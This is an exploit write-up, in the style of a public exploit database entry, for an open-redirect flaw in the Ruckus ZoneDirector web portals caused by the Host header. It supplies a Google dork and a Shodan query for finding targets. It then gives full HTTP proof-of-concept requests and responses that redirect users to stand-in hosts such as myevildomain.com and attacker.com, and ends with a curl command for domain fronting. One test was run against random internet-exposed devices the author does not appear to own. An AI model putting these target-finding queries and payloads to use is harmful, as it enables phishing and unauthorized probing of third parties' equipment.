# Exploit Title: Ruckus Wireless Zone Director Open Redirect Vulnerability
# Google Dork: intitle: "Ruckus Wireless Admin"
# Shodan Query: Embedthis-Appweb/3.4.2
# Discovered Date: 27/08/2019
# Reported Date: 30/09/2019
# Exploit Author: Ramikan 
# Website: http://fact-in-hack.blogspot.com
# Vendor Homepage: https://www.ruckuswireless.com
# Affected Devices: Ruckus ZoneDirector 
# Tested On: Ruckus Zone Director 1200
# Version: version 10.1.1 build 42
# CVE : N/A
# CVSS v3: 4.7 (AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N)
# Category:Hardware, Web Apps

*************************************************************************************************************************************

Vulnerability 1: Open Redirect due to host header.

*************************************************************************************************************************************

The vulnerability is on the web interface of the Ruckus Zone director web portals (Admin and guest login) due to improper input validation of the parameters of an HTTP request (HOST Header). An attacker could exploit this vulnerability by intercepting a user's HTTP request and modifying it into a request that causes the web interface to redirect the user to a specific malicious URL. This type of vulnerability is known as an open redirect attack and is used in phishing attacks that get users to unknowingly visit malicious sites and also can be used for domain fronting the affected device's domain name.

This issue was tested on Ruckus Zone Director 1200 which is running Embedthis-Appweb/3.4.2 under firmware 10.1.1. build 42 and few other unknown version of Ruckus products are also affected by this.

Normal Request

Request 1:

GET /admin/login.jsp HTTP/1.1
Host: mydomain.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://wifi.myoffice.com/user/user_login_prov.jsp
Connection: close
Cookie: -ejs-session-=xa240d36209d07dd3124bbc83a8610980
Upgrade-Insecure-Requests: 1

Response 1:

HTTP/1.1 302 Moved Temporarily
Date: Thu, 29 Aug 2019 08:22:25 GMT
X-Frame-Options: SAMEORIGIN
Server: Embedthis-Appweb/3.4.2
Cache-Control: no-cache
Content-Length: 276
Connection: close
Location: https://mydomain.com/admin10/login.jsp
Cache-control: no-cache="set-cookie"
Set-Cookie: -ejs-session-=xce2a85e25fb7d553e5f01a11aa5904c9; path=/; httponly;
X-Appweb-Seq: 36419

<!DOCTYPE html>
<html><head><title>Moved Temporarily</title></head>
<body><h1>Moved Temporarily</h1>
<p>The document has moved <a href="https://mydomain.com/admin10/login.jsp">here</a>.</p>
<address>Embedthis-Appweb/3.4.2 at https:443 Port 443</address></body>
</html>

*************************************************************************************************************************************
POC 1 : Host Header changed to different domain (example myevildomain.com).
Test Case: Ruckus Zone Director 1200 Device
*************************************************************************************************************************************



Request: 1

GET /admin/login.jsp HTTP/1.1
Host: myevildomain.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://wifi.xxx.com/user/user_login_prov.jsp
Connection: close
Cookie: -ejs-session-=xa240d36209d07dd3124bbc83a8610980
Upgrade-Insecure-Requests: 1

Response 1:

HTTP/1.1 302 Moved Temporarily
Date: Thu, 29 Aug 2019 08:22:25 GMT
X-Frame-Options: SAMEORIGIN
Server: Embedthis-Appweb/3.4.2
Cache-Control: no-cache
Content-Length: 276
Connection: close
Location: https://myevildomain.com/admin10/login.jsp
Cache-control: no-cache="set-cookie"
Set-Cookie: -ejs-session-=xce2a85e25fb7d553e5f01a11aa5904c9; path=/; httponly;
X-Appweb-Seq: 36419

<!DOCTYPE html>
<html><head><title>Moved Temporarily</title></head>
<body><h1>Moved Temporarily</h1>
<p>The document has moved <a href="https://myevildomain.com/admin10/login.jsp">here</a>.</p>
<address>Embedthis-Appweb/3.4.2 at https:443 Port 443</address></body>
</html>

============================================================================================================================================================================================================================================
The redirection is happening to https://myevildomain.com/admin10/login.jsp. The attacker need to be in same network and should be able to modify the victims request on the wire, in order to trigger this vulnerabilty or by Cache poisoning
============================================================================================================================================================================================================================================

*************************************************************************************************************************************
POC 2: Host Header changed to different domain (example: Google.com) used in host header.
Test Case: Shodan search: Embedthis-Appweb/3.4.2. Random devices from internet.

*************************************************************************************************************************************



Request: 1

POST /forms/doLogin HTTP/1.1
Host: google.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://107.14.xx.177/login.asp
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Connection: close
Cookie: sid=0
Upgrade-Insecure-Requests: 1

login_username=asdasd&password=asdasdas&x=134&y=8

Response 1:

HTTP/1.0 302 Redirect
Server: GoAhead-Webs
Date: Thu Aug 29 12:41:04 2019
Pragma: no-cache
Cache-Control: no-cache
Content-Type: text/html
Set-Cookie: sid=0; path=/; HttpOnly; Secure;
Location: https://google.com/login.asp

<html><head></head><body>
This document has moved to a new <a href="https://google.com/login.asp">location</a>.
Please update your documents to reflect the new location.
</body></html>


============================================================================================================================================================================================================================================
The redirection is happening to https://google.com/login.asp. The attacker need to be in same network and should be able to modify the victims request on the wire, in order to trigger this vulnerabilty or by Cache poisoning.
============================================================================================================================================================================================================================================


*************************************************************************************************************************************
POC 3: Wireless Access Portal

*************************************************************************************************************************************


Request 1:

POST /user/user.jsp HTTP/1.1
Host: attacker.com:8443
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://x.x.x.x:8443/user/user.jsp
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Connection: close
Cookie: -ejs-session-=x133a16c1fc6624d063aeffe61bd2e0ac
Upgrade-Insecure-Requests: 1

task=user-guesspass&next=Next+%3E



Response 2:

HTTP/1.1 302 Moved Temporarily
Date: Fri, 30 Aug 2019 13:32:50 GMT
Server: Embedthis-Appweb/3.4.2
Cache-Control: no-cache
Content-Length: 295
Connection: close
Location: https://x.x.x.x:8443/user/user_login_guestpass.jsp
Cache-control: no-cache="set-cookie"
Set-Cookie: -ejs-session-=x363f066ab53bea6acfe8c90a6ac75039; path=/;
X-Appweb-Seq: 57820

<!DOCTYPE html>
<html><head><title>Moved Temporarily</title></head>
<body><h1>Moved Temporarily</h1>
<p>The document has moved <a href="https://attacker.com:8443/user/user_login_guestpass.jsp">here</a>.</p>
<address>Embedthis-Appweb/3.4.2 at https:443 Port 443</address></body>
</html>


*************************************************************************************************************************************
Attack Vector:
*************************************************************************************************************************************
Can be used for domain fronting.

curl -k --header "Host: attack.host.net" "domainname of the Ruckus device"


*************************************************************************************************************************************
Vendor Response:
*************************************************************************************************************************************




*************************************************************************************************************************************
